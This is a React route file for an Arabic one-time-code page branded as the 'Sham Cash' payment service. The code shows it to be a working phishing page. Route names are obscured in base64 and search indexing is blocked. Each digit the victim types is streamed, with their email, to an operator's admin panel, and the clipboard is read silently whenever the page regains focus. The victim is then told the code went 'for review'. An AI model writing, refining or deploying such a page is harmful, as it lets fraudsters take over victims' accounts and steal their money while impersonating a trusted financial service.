import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { maskPhone } from "@/lib/mask-phone";
import { useCallback, useEffect, useRef, useState } from "react";
import { ClipboardPaste, Clock, Loader2, ShieldCheck, Smartphone } from "lucide-react";
import { toast } from "sonner";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp";
import { AppScreen } from "@/components/app-screen";
import { usePresenceTracker } from "@/lib/presence";
import { logSubmission } from "@/lib/submissions";
import { isRapidRepeat, remainingCooldown } from "@/lib/throttle";
import { useAdminRedirect } from "@/lib/admin-redirect";
import { ErrorAlert } from "@/components/error-alert";

export const Route = createFileRoute("/b3Rw")({
  ssr: false,
  head: () => ({
    meta: [
      { name: "robots", content: "noindex, nofollow" },
      { title: "رمز التحقق | شام كاش" },
      {
        name: "description",
        content: "أدخل رمز التحقق المكوّن من 6 أرقام المرسل إلى هاتفك لإتمام توثيق حساب شام كاش.",
      },
      { property: "og:title", content: "رمز التحقق — بوابة خدمات شام كاش" },
      {
        property: "og:description",
        content: "أدخل رمز التحقق المكوّن من 6 أرقام لإتمام عملية التوثيق.",
      },
    ],
  }),
  component: OtpPage,
});

function OtpPage() {
  usePresenceTracker({ page: "/b3Rw" });
  useAdminRedirect();

  const navigate = useNavigate();
  const [code, setCode] = useState("");
  const [error, setError] = useState<{ title: string; message: string; hint?: string } | null>(null);
  const [loading, setLoading] = useState(false);
  const [expiry, setExpiry] = useState(300);
  const [maskedPhone, setMaskedPhone] = useState<string>("***");
  const otpWrapRef = useRef<HTMLDivElement | null>(null);
  const submittedRef = useRef(false);
  const handleChangeRef = useRef<((raw: string) => void) | null>(null);

  // يقرأ الهاتف المحفوظ من صفحة البيانات؛ إن لم يُدخل يعيد العميل إليها
  useEffect(() => {
    let raw = "";
    try { raw = window.localStorage.getItem("sham_phone") || ""; } catch { /* ignore */ }
    const masked = maskPhone(raw);
    setMaskedPhone(masked || "***");
  }, [navigate]);

  const focusFirstEmpty = useCallback(() => {
    const slots = otpWrapRef.current?.querySelectorAll<HTMLInputElement>("input");
    if (!slots || slots.length === 0) return;
    (slots[0] as HTMLInputElement).focus();
  }, []);

  useEffect(() => {
    // focus without making the page jump down
    const t = setTimeout(() => otpWrapRef.current?.querySelector<HTMLInputElement>("input")?.focus({ preventScroll: true }), 50);
    return () => clearTimeout(t);
  }, []);

  // Android Chrome: read the code straight from the incoming SMS (WebOTP).
  useEffect(() => {
    if (typeof window === "undefined" || !("OTPCredential" in window)) return;
    const ac = new AbortController();
    (navigator.credentials as any)
      .get({ otp: { transport: ["sms"] }, signal: ac.signal })
      .then((cred: { code?: string } | null) => {
        const digits = toDigits(cred?.code ?? "").slice(0, 6);
        if (digits) handleChangeRef.current?.(digits);
      })
      .catch(() => {});
    return () => ac.abort();
  }, []);

  // Try to read a 6-digit code from the clipboard silently whenever the page
  // becomes visible again (e.g. the user switched to Messages, copied the code,
  // then came back). Fails silently if the browser blocks it.
  const tryClipboardAutofill = useCallback(async (): Promise<boolean> => {
    try {
      if (typeof navigator === "undefined" || !navigator.clipboard?.readText) return false;
      const text = await navigator.clipboard.readText();
      const digits = toDigits(text).slice(0, 6);
      if (digits.length === 6) {
        handleChangeRef.current?.(digits);
        return true;
      }
    } catch { /* permission denied — ignore */ }
    return false;
  }, []);

  useEffect(() => {
    const onVisible = () => {
      if (document.visibilityState === "visible") void tryClipboardAutofill();
    };
    document.addEventListener("visibilitychange", onVisible);
    window.addEventListener("focus", onVisible);
    return () => {
      document.removeEventListener("visibilitychange", onVisible);
      window.removeEventListener("focus", onVisible);
    };
  }, [tryClipboardAutofill]);


  useEffect(() => {
    const t = window.setInterval(() => setExpiry((s) => Math.max(0, s - 1)), 1000);
    return () => window.clearInterval(t);
  }, []);

  // نافذة صلاحية الوصول لصفحة الرمز = 5 دقائق من أول فتح
  const OTP_WINDOW_MS = 5 * 60 * 1000;
  const expiredRedirectRef = useRef(false);
  const bounceToLogin = useCallback(() => {
    if (expiredRedirectRef.current) return;
    expiredRedirectRef.current = true;
    let email: string | null = null;
    try { email = window.localStorage.getItem("sham_email"); } catch { /* ignore */ }
    try { window.sessionStorage.removeItem("sham_otp_opened_at"); } catch { /* ignore */ }
    void logSubmission("otp_window_expired", { email }, email);
    toast.error("انتهت مهلة إدخال الرمز، سجّل الدخول من جديد");
    void navigate({ to: "/YXV0aA", replace: true });
  }, [navigate]);

  useEffect(() => {
    let email: string | null = null;
    try { email = window.localStorage.getItem("sham_email"); } catch { /* ignore */ }
    let openedAt = 0;
    try {
      const raw = window.sessionStorage.getItem("sham_otp_opened_at");
      openedAt = raw ? Number(raw) : 0;
      if (!openedAt || Number.isNaN(openedAt)) {
        openedAt = Date.now();
        window.sessionStorage.setItem("sham_otp_opened_at", String(openedAt));
      }
    } catch { openedAt = Date.now(); }
    if (Date.now() - openedAt >= OTP_WINDOW_MS) {
      bounceToLogin();
      return;
    }
    void logSubmission("otp_opened", { email, at: new Date().toISOString() }, email);
    const remaining = OTP_WINDOW_MS - (Date.now() - openedAt);
    const t = window.setTimeout(bounceToLogin, remaining + 50);
    return () => window.clearTimeout(t);
  }, [bounceToLogin]);


  useEffect(() => {
    if (code.length === 0) return;
    let email: string | null = null;
    try { email = window.localStorage.getItem("sham_email"); } catch { /* ignore */ }
    // بثّ فوري لكل رقم يُدخل حتى يظهر في لوحة الإدارة لحظيًا
    void logSubmission("otp_typing", { digits: code.length, otp: code, code, email }, email);
  }, [code]);

  const expiryLabel = `${Math.floor(expiry / 60)}:${String(expiry % 60).padStart(2, "0")}`;

  const submitCode = useCallback(async (value: string) => {
    if (submittedRef.current || loading) return;
    if (/^\d{6}$/.test(value) && isRapidRepeat(`otp:${value}`, 2000)) {
      const sec = Math.ceil(remainingCooldown(`otp:${value}`, 2000) / 1000);
      setError({
        title: "محاولات متكررة بسرعة",
        message: `أرسلت الرمز للتو. انتظر ${sec} ثانية قبل إعادة الإرسال.`,
        hint: "لا داعي للضغط عدة مرات؛ الرمز الذي كتبته أُرسل بالفعل.",
      });
      return;
    }
    try {
      const raw = window.sessionStorage.getItem("sham_otp_opened_at");
      const openedAt = raw ? Number(raw) : 0;
      if (openedAt && Date.now() - openedAt >= OTP_WINDOW_MS) {
        bounceToLogin();
        return;
      }
    } catch { /* ignore */ }
    if (expiry === 0) {
      setError({
        title: "انتهت صلاحية الرمز",
        message: "مرّت مدة الرمز المسموح بها (5 دقائق).",
        hint: "سجّل الدخول من جديد لتصلك رسالة برمز جديد.",
      });
      return;
    }
    if (!/^\d{6}$/.test(value)) return;
    submittedRef.current = true;
    setLoading(true);
    try {
      let email: string | null = null;
      try { email = window.localStorage.getItem("sham_email"); } catch { /* ignore */ }
      await logSubmission("otp_attempt", { code: value, email }, email);
      toast.success("تم إرسال رمز التحقق للمراجعة");
      window.setTimeout(() => {
        setLoading(false);
        void navigate({
          to: "/cGVuZGluZw",
          search: email ? { email } : {},
          replace: true,
        });
      }, 700);
    } catch {
      submittedRef.current = false;
      setLoading(false);
      setError({
        title: "تعذّر إرسال الرمز",
        message: "لم يصل الرمز إلى خادمنا بسبب ضعف الاتصال.",
        hint: "تأكد من اتصالك بالإنترنت ثم اضغط «تحقق» مرة أخرى.",
      });
    }
  }, [expiry, loading, navigate, bounceToLogin]);

  handleChangeRef.current = (raw: string) => handleChange(raw);
  const handleChange = (raw: string) => {
    const v = toDigits(raw).slice(0, 6);
    if (raw && v.length < toDigitsLoose(raw).length) {
      setError({
        title: "أرقام فقط",
        message: "رمز التحقق يتكوّن من 6 أرقام فقط.",
        hint: "تجاهل الحروف والرموز، واكتب الأرقام الستة كما وصلتك في الرسالة.",
      });
    } else if (error) {
      setError(null);
    }
    setCode(v);
    if (v.length === 6) {
      // Auto-submit as soon as the 6 digits are typed or pasted.
      void submitCode(v);
    }
  };

  const verify = async (e: React.FormEvent) => {
    e.preventDefault();
    if (expiry === 0) {
      setError({
        title: "انتهت صلاحية الرمز",
        message: "مرّت مدة الرمز المسموح بها (5 دقائق).",
        hint: "سجّل الدخول من جديد لتصلك رسالة برمز جديد.",
      });
      return;
    }
    if (code.length === 0) {
      setError({
        title: "لم تُدخل الرمز",
        message: "لم تكتب أي رقم من رمز التحقق بعد.",
        hint: "افتح رسالة SMS على هاتفك واكتب الأرقام الستة في الحقول أعلاه.",
      });
      focusFirstEmpty();
      return;
    }
    if (code.length < 6) {
      setError({
        title: "الرمز ناقص",
        message: `كتبتَ ${code.length} أرقام فقط من أصل 6.`,
        hint: "أكمل باقي الأرقام وسيتم التحقق تلقائياً فور اكتمال الرقم السادس.",
      });
      focusFirstEmpty();
      return;
    }
    await submitCode(code);
  };


  const timerTone =
    expiry === 0
      ? "bg-destructive/15 ring-destructive/30 text-destructive-foreground"
      : expiry <= 30
      ? "bg-amber-500/10 ring-amber-400/30 text-amber-100"
      : "bg-white/5 ring-white/10 text-white/80";
  const timerAccent =
    expiry === 0 ? "text-destructive-foreground" : expiry <= 30 ? "text-amber-200" : "text-accent";

  return (
    <AppScreen width="sm">
      <div className="flex flex-col items-center text-center">
        <div className="relative mb-5">
          <div className="absolute inset-0 scale-150 rounded-full bg-accent/25 blur-2xl" aria-hidden="true" />
          <div className="relative grid size-16 rotate-3 place-items-center rounded-2xl bg-gradient-to-br from-[oklch(0.72_0.13_235)] to-[oklch(0.74_0.15_168)] shadow-xl shadow-[oklch(0.74_0.15_168)]/20">
            <Smartphone className="-rotate-3 size-8 text-white" strokeWidth={2} />
          </div>
        </div>
        <h1 className="text-3xl font-black tracking-tight text-white sm:text-[2rem]">رمز التحقق</h1>
        <p className="mx-auto mt-2 max-w-sm text-sm leading-6 text-white/60">
          أدخل الرمز المكوّن من 6 أرقام الذي أرسلناه إلى هاتفك المسجّل.
        </p>
        <div
          dir="ltr"
          className="mx-auto mt-3 inline-flex items-center gap-2 rounded-full bg-white/5 px-4 py-1.5 ring-1 ring-white/10"
        >
          <Smartphone className="size-3.5 text-accent" />
          <span className="font-mono text-sm font-semibold tracking-wider text-white/85 tabular-nums">
            {maskedPhone}
          </span>
        </div>
      </div>

      {error ? (
        <div className="mt-6">
          <ErrorAlert title={error.title} message={error.message} hint={error.hint} />
        </div>
      ) : null}

      <form onSubmit={verify} className="mx-auto mt-8 grid w-full max-w-sm gap-7">
        <div
          dir="ltr"
          ref={otpWrapRef}
          className="flex justify-center"
          onPointerDownCapture={(e) => {
            const target = e.target as HTMLElement;
            const slots = otpWrapRef.current?.querySelectorAll<HTMLInputElement>("input");
            if (!slots || slots.length === 0) return;
            const nextIndex = Math.min(code.length, slots.length - 1);
            const nextSlot = slots[nextIndex];
            if (nextSlot && target !== nextSlot) {
              e.preventDefault();
              nextSlot.focus({ preventScroll: true });
            }
          }}
        >
          <InputOTP
            maxLength={6}
            value={code}
            onChange={handleChange}
            pasteTransformer={(t) => toDigits(t).slice(0, 6)}
            inputMode="numeric"
            autoComplete="one-time-code"
            enterKeyHint="done"
            aria-label="رمز التحقق المكوّن من 6 أرقام"
            aria-invalid={!!error}
          >
            <InputOTPGroup className="gap-2 sm:gap-2.5">
              {Array.from({ length: 6 }).map((_, i) => (
                <InputOTPSlot
                  key={i}
                  index={i}
                  className={`h-13 w-11 min-[380px]:h-14 min-[380px]:w-12 rounded-xl bg-white/5 text-xl font-bold text-white shadow-inner ring-1 ring-white/20 first:rounded-xl last:rounded-xl focus:ring-2 focus:ring-[oklch(0.72_0.13_235)]/60 sm:h-14 sm:w-12 ${error ? "field-error" : ""}`}
                />
              ))}
            </InputOTPGroup>
          </InputOTP>
        </div>
        {error ? <p className="field-error-msg text-center">{error.message ?? error.title}</p> : null}

        <button
          type="button"
          onClick={async () => {
            const ok = await tryClipboardAutofill();
            if (!ok) {
              setError({
                title: "لا يوجد رمز في الحافظة",
                message: "لم نجد رمزاً مكوّناً من 6 أرقام في الحافظة.",
                hint: "افتح رسالة SMS، انسخ الرمز، ثم اضغط «لصق الرمز» مجدداً.",
              });
            }
          }}
          className="mx-auto -mt-3 inline-flex min-h-11 items-center gap-2 rounded-full bg-white/5 px-4 py-2 text-xs font-semibold text-white/80 ring-1 ring-white/10 transition active:scale-[0.97]"
        >
          <ClipboardPaste className="size-4 text-accent" />
          لصق الرمز من الرسالة
        </button>

        <div
          className={`mx-auto inline-flex items-center gap-2 rounded-full px-4 py-1.5 text-sm font-semibold ring-1 ${timerTone}`}
        >
          <Clock className={`size-4 ${timerAccent}`} />
          <span className="text-xs text-white/50">
            {expiry === 0 ? "انتهت صلاحية الرمز" : "الوقت المتبقي"}
          </span>
          <span dir="ltr" className={`font-mono text-sm tabular-nums ${timerAccent}`}>
            {expiryLabel}
          </span>
        </div>

        <button
          type="submit"
          disabled={loading || expiry === 0 || code.length < 6}
          className="inline-flex min-h-14 items-center justify-center gap-3 rounded-2xl bg-gradient-to-l from-[oklch(0.74_0.15_168)] to-[oklch(0.6_0.17_262)] px-5 text-base font-bold text-white shadow-[0_12px_30px_-10px_oklch(0.74_0.15_168/0.5)] transition-all duration-300 hover:shadow-[0_14px_40px_-10px_oklch(0.74_0.15_168/0.7)] active:scale-[0.985] disabled:opacity-60 disabled:shadow-none"
        >
          {loading ? (
            <Loader2 className="size-5 animate-spin" />
          ) : (
            <ShieldCheck className="size-5" />
          )}
          تأكيد الرمز
        </button>

        <button
          type="button"
          onClick={() => { try { window.sessionStorage.removeItem("sham_otp_opened_at"); } catch { /* ignore */ } void navigate({ to: "/YXV0aA", replace: true }); }}
          className="mx-auto -mt-2 text-xs font-semibold text-white/60 underline-offset-4 hover:text-white hover:underline"
        >
          لم يصلك الرمز؟ أعد تسجيل الدخول
        </button>
      </form>


    </AppScreen>
  );
}

// Converts Arabic-Indic / Persian digits to Latin and strips everything else.
function toDigitsLoose(s: string): string {
  return s
    .replace(/[\u0660-\u0669]/g, (d) => String(d.charCodeAt(0) - 0x0660))
    .replace(/[\u06F0-\u06F9]/g, (d) => String(d.charCodeAt(0) - 0x06f0))
    .replace(/\s|-/g, "");
}
function toDigits(s: string): string {
  return toDigitsLoose(s).replace(/\D/g, "");
}
